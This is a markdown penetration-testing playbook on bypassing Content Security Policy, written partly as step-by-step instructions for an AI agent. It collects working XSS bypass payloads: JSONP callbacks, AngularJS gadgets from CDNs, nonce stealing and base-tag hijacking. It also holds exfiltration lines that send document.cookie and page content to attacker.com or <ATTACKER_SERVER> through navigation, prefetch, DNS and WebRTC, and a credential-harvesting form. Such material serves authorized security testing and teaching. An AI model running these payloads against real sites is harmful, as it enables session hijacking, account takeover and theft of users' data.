# CSP Bypass

> **Summary**: Content Security Policy (CSP) is a browser security mechanism that restricts resource loading and script execution. Misconfigurations, overly permissive directives, or known bypass techniques can allow attackers to execute JavaScript despite CSP protections.
> **Impact**: Cross-site scripting (XSS) execution despite CSP, data exfiltration, session hijacking.
> **Typical Severity**: Medium to High (depends on CSP strength and bypass method)

## Detection

### Indicators
- `Content-Security-Policy` or `Content-Security-Policy-Report-Only` headers present in HTTP responses
- `<meta http-equiv="Content-Security-Policy">` tag in HTML
- CSP contains overly permissive directives: `unsafe-inline`, `unsafe-eval`, wildcards, `data:`, `blob:`
- CSP allows loading scripts from CDNs that host exploitable libraries (e.g., cdnjs, Google APIs)

### Automated Detection
```bash
# Extract CSP header
curl -sI <TARGET> | grep -i 'content-security-policy'

# Analyze with Google CSP Evaluator
# https://csp-evaluator.withgoogle.com/
```

### Manual Detection
1. Retrieve the CSP header from the target response
2. Paste into [CSP Evaluator](https://csp-evaluator.withgoogle.com/) for automated analysis
3. Check each directive for known weaknesses (see bypass techniques below)
4. Test identified bypasses with actual payloads

## CSP Directives Reference

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all unspecified fetch directives |
| `script-src` | JavaScript sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | Fetch, XHR, WebSocket URLs |
| `font-src` | Font sources |
| `frame-src` | Iframe sources |
| `frame-ancestors` | Which origins can embed this page (replaces X-Frame-Options) |
| `object-src` | Plugin sources (Flash, Java) |
| `base-uri` | Allowed `<base>` element URLs |
| `form-action` | Form submission targets |
| `report-uri` / `report-to` | Violation reporting endpoint |

## Exploitation

### Prerequisites
- An XSS vulnerability exists in the target application
- CSP is blocking the XSS payload execution
- A weakness or misconfiguration in the CSP policy allows a bypass

### Step-by-Step

1. **Retrieve and analyze the CSP policy**:
   ```bash
   curl -sI <TARGET> | grep -i content-security-policy
   ```
   **Success**: Full CSP policy obtained.

2. **Identify weaknesses** by checking against known bypass patterns (see Payloads below).
   **Success**: One or more bypass vectors identified.

3. **Craft a bypass payload** appropriate for the identified weakness.
   **Success**: XSS payload executes despite CSP.

4. **Exfiltrate data** through a channel allowed by the CSP (e.g., if `connect-src` allows a domain you control, or via DNS/navigation).

### Payloads

#### `unsafe-inline` Bypass
If `script-src` includes `'unsafe-inline'`:
```html
<script>alert(document.domain)</script>
"/><script>alert(1)</script>
```

#### `unsafe-eval` Bypass
If `script-src` includes `'unsafe-eval'`:
```html
<img src=x onerror="eval('alert(1)')">
```

#### Wildcard (`*`) in script-src
```
CSP: script-src 'self' https: data: *;
```
```html
"/><script src="https://<ATTACKER>/evil.js"></script>
"/><script src="data:text/javascript,alert(1)"></script>
```

#### Missing `object-src` / `default-src`
```
CSP: script-src 'self';
```
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

#### File Upload + `'self'`
```
CSP: script-src 'self'; object-src 'none';
```
If you can upload a JS file to the same origin:
```html
"/><script src="/uploads/evil.png.js"></script>
```

#### JSONP Endpoints on Allowed Domains
If CSP allows a domain with JSONP endpoints:
```
CSP: script-src 'self' https://accounts.google.com;
```
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**Common JSONP endpoints on CDNs:**
```
https://accounts.google.com/o/oauth2/revoke?callback=PAYLOAD
https://www.google.com/complete/search?client=chrome&q=test&callback=PAYLOAD
```

#### AngularJS + CDN (CSP Bypass via CSTI)
```
CSP: script-src 'self' https://cdnjs.cloudflare.com 'unsafe-eval';
```
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}
</div>
```

**Without `unsafe-eval` (using `ng-csp`):**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>
```

**Angular + Prototype.js (window object access):**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert(1)}}
</div>
```

#### Google reCAPTCHA JS as CSP Bypass
```
CSP: script-src 'self' https://www.google.com;
```
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">
```

#### Nonce Reuse / Nonce Stealing
If CSP uses nonces and you have limited JS execution:
```html
<img src="x" ng-on-error='
  doc=$event.target.ownerDocument;
  a=doc.defaultView.top.document.querySelector("[nonce]");
  b=doc.createElement("script");
  b.src="//attacker.com/evil.js";
  b.nonce=a.nonce;
  doc.body.appendChild(b)'>
```

#### `strict-dynamic` Bypass
If a trusted script creates new script elements, those are automatically trusted:
```javascript
// If you control input to a trusted script that creates DOM elements:
var s = document.createElement('script');
s.src = 'https://attacker.com/evil.js';
document.body.appendChild(s);  // Allowed by strict-dynamic
```

#### `base-uri` Missing
If `base-uri` is not restricted:
```html
<base href="https://attacker.com/">
<!-- All relative script paths now load from attacker.com -->
```

#### `form-action` Missing
If `form-action` is not restricted (note: `default-src` does NOT cover `form-action`):
```html
<form action="https://attacker.com/steal" method="POST">
  <!-- Browsers may auto-fill credentials here -->
  <input name="username"><input name="password" type="password">
  <button type="submit">Login</button>
</form>
```

#### Dangling Markup Injection
When you cannot execute JS but can inject HTML, exfiltrate page content:
```html
<img src="https://attacker.com/steal?content=
<!-- Page content after this point becomes the img src URL parameter -->
```

#### `self` + `unsafe-inline` via Iframes
Load a same-origin resource (image, CSS, text file) in an iframe. These resources lack their own CSP headers, allowing JS execution:
```javascript
frame = document.createElement("iframe");
frame.src = "/robots.txt";  // Or any text/image file
document.body.appendChild(frame);
script = document.createElement("script");
script.src = "//attacker.com/evil.js";
window.frames[0].document.head.appendChild(script);
```

#### CSP via Meta Tag Bypass
If CSP is set via `<meta>` tag instead of HTTP header:
- `<meta>` CSP does not support `report-uri` or `frame-ancestors`
- If you can inject before the `<meta>` tag, your scripts execute before CSP takes effect
- `<meta>` CSP can potentially be overridden by another `<meta>` tag

#### Data Exfiltration When `connect-src` is Restricted
```html
<!-- Via navigation (if navigate-to is not set) -->
<script>location='https://attacker.com/?c='+document.cookie</script>

<!-- Via link prefetch -->
<link rel="prefetch" href="https://attacker.com/?c=COOKIE_VALUE">

<!-- Via DNS prefetch -->
<link rel="dns-prefetch" href="//COOKIE_VALUE.attacker.com">

<!-- Via WebRTC (if not blocked) -->
<script>
var pc = new RTCPeerConnection({"iceServers":[{"urls":"stun:attacker.com"}]});
pc.createOffer().then(o=>pc.setLocalDescription(o));
</script>
```

### Proof of Concept

```bash
# 1. Get CSP
curl -sI https://<TARGET>/ | grep -i content-security-policy

# 2. Analyze online
# Paste CSP into: https://csp-evaluator.withgoogle.com/

# 3. Test bypass (example: Angular on CDN)
# If script-src allows cdnjs.cloudflare.com:
# Inject: <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

## Bypasses

- If `script-src 'nonce-XXX'` is used: look for nonce in DOM to steal and reuse
- If `strict-dynamic` is used: find a trusted script that can be tricked into loading attacker JS
- If CSP is only `report-only`: payloads execute normally (CSP not enforced)
- If CSP varies by endpoint: find a page with weaker CSP and chain via iframes
- If CSP blocks inline but allows `data:` URIs: use `<script src="data:text/javascript,alert(1)">`

## Escalation

- **CSP bypass + XSS = full XSS impact**: Session hijacking, account takeover, phishing
- **CSP bypass + data exfiltration**: Steal sensitive page content via allowed channels
- **Chain with CSTI**: Use Angular/Vue loaded from allowed CDNs for template injection
- **Chain with clickjacking**: If `frame-ancestors` is not set, combine with UI redressing

## Tools

| Tool | Usage |
|------|-------|
| CSP Evaluator | [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/) -- Analyze CSP for weaknesses |
| Burp Suite | Inspect CSP headers and test bypass payloads |
| CSPRecon | Enumerate CSP policies across subdomains |
| csp-bypass | [GitHub](https://github.com/nicornk/csp-bypass) -- CSP bypass payloads collection |
| Wappalyzer | Identify allowed third-party libraries for gadget-based bypasses |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for CSP bypass vulnerabilities.

### Phase 1: Discovery
1. Retrieve the CSP policy from the target:
   ```bash
   curl -sI https://<TARGET>/ | grep -i content-security-policy
   ```
2. Check for CSP in `<meta>` tags as well (view page source, search for `Content-Security-Policy`)
3. Check if CSP is enforced or report-only: `Content-Security-Policy-Report-Only` means no enforcement
4. Analyze the CSP with [CSP Evaluator](https://csp-evaluator.withgoogle.com/):
   - Paste the full CSP policy and review the findings
5. Identify the `report-uri` or `report-to` directive (useful for understanding what the policy covers)
6. Check if CSP varies by endpoint: test multiple pages and compare policies

### Phase 2: Validation
1. **Identify weak directives** in the CSP:
   - `'unsafe-inline'` in `script-src` → inline scripts execute freely
   - `'unsafe-eval'` in `script-src` → `eval()`, `setTimeout(string)`, `new Function(string)` allowed
   - Wildcards (`*`, `https:`, `data:`) in `script-src` → load scripts from arbitrary sources
   - Missing `object-src` with no `default-src` → plugin-based execution (Flash, data URIs)
   - Missing `base-uri` → `<base>` tag injection redirects relative script paths
   - Missing `form-action` → forms can submit to attacker-controlled domains
   - JSONP endpoints on allowed domains (Google APIs, CDNs)
   - Angular/Vue libraries available on allowed CDNs (cdnjs, Google)
   - Nonce-based policy where nonce is predictable or stealable from DOM
2. **Confirm XSS injection point exists**: Identify where you can inject HTML/JS (reflected or stored XSS)
3. **Test basic XSS payload** to confirm CSP blocks it:
   ```html
   <script>alert(1)</script>
   ```
   If blocked by CSP, proceed with bypass techniques

### Phase 3: Exploitation
1. **`unsafe-inline` present**: Standard XSS payloads work directly:
   ```html
   <script>alert(document.domain)</script>
   ```
2. **JSONP callback on allowed domain**: If `script-src` allows a domain with JSONP endpoints:
   ```html
   <script src="https://<ALLOWED_DOMAIN>/endpoint?callback=alert(document.domain)//"></script>
   ```
   Common JSONP endpoints: `accounts.google.com/o/oauth2/revoke?callback=`, `www.google.com/complete/search?callback=`
3. **`base-uri` not restricted**: Inject a `<base>` tag to redirect relative script paths to attacker server:
   ```html
   <base href="https://<ATTACKER_SERVER>/">
   ```
4. **Angular on allowed CDN**: If `script-src` allows `cdnjs.cloudflare.com` or similar:
   ```html
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
   <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
   ```
5. **`object-src` not restricted**: Use `<object>` with data URI:
   ```html
   <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
   ```
6. **Nonce stealing**: If CSP uses nonces and you have limited JS execution, steal the nonce from the DOM and create a new script with it
7. **Dangling markup exfiltration**: If no JS execution is possible, inject unclosed tags to exfiltrate page content:
   ```html
   <img src="https://<ATTACKER_SERVER>/steal?content=
   ```
8. **Data exfiltration via navigation**: If `connect-src` blocks fetch/XHR but no `navigate-to`:
   ```javascript
   location='https://<ATTACKER_SERVER>/?c='+document.cookie
   ```

### Phase 4: Escalation
1. CSP bypass + XSS = full XSS impact: session hijacking via cookie theft, account takeover
2. Exfiltrate sensitive page content (CSRF tokens, PII, API keys) through the allowed channel
3. Chain with CSTI: use Angular/Vue template injection loaded from allowed CDNs
4. Chain with clickjacking: if `frame-ancestors` is not set in CSP, combine with UI redressing
5. If CSP is only `report-only`: all XSS payloads execute without restriction -- escalate directly

## Decision Tree

```
CSP Policy Analyzed
├── unsafe-inline in script-src?
│   └── YES → Standard XSS payloads work (no bypass needed)
├── unsafe-eval in script-src?
│   └── YES → eval(), setTimeout(string), new Function() available
├── Allowed domain has JSONP endpoint?
│   └── YES → <script src="https://<ALLOWED>/endpoint?callback=alert(1)//"></script>
├── Allowed CDN hosts Angular/Vue?
│   └── YES → Load Angular + CSTI: {{$eval.constructor('alert(1)')()}}
├── base-uri not restricted?
│   └── YES → <base href="https://<ATTACKER>/">  → hijack relative script paths
├── object-src not restricted?
│   └── YES → <object data="data:text/html,..."> → script execution via plugin
├── form-action not restricted?
│   └── YES → <form action="https://<ATTACKER>/steal"> → credential exfil
├── Nonce-based policy?
│   ├── Nonce in DOM? → Steal and reuse for injected script
│   └── strict-dynamic? → Find trusted script that creates elements
├── connect-src blocks exfil?
│   ├── navigation allowed? → location='https://<ATTACKER>/?'+data
│   ├── DNS prefetch? → <link rel="dns-prefetch" href="//DATA.<ATTACKER>">
│   └── WebRTC? → STUN request to attacker server
├── CSP only in <meta> tag?
│   └── Inject before <meta>? → Script executes before CSP applies
└── Content-Security-Policy-Report-Only?
    └── Not enforced → All payloads execute freely
```

## Success Criteria
- [ ] JavaScript executes in the browser despite the CSP policy being present
- [ ] XSS payload confirmed via `alert()`, `console.log()`, or callback to `<ATTACKER_SERVER>`
- [ ] Sensitive data exfiltrated (cookies, tokens, page content) through an allowed channel
- [ ] CSP bypass technique documented with specific payload and affected directive

## References

- [PortSwigger - CSP Bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [HackTricks - CSP Bypass](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [AngularJS CSP Bypass via CDNjs](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)
- [Wallarm - Tricking CSP](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

## Cross-References

- [XSS](xss.md) -- CSP is a defense against XSS; bypasses restore XSS impact
- [Clickjacking](clickjacking.md) -- `frame-ancestors` directive in CSP replaces X-Frame-Options
- [CSTI](csti.md) -- Angular/Vue loaded from CDNs enable CSTI-based CSP bypasses
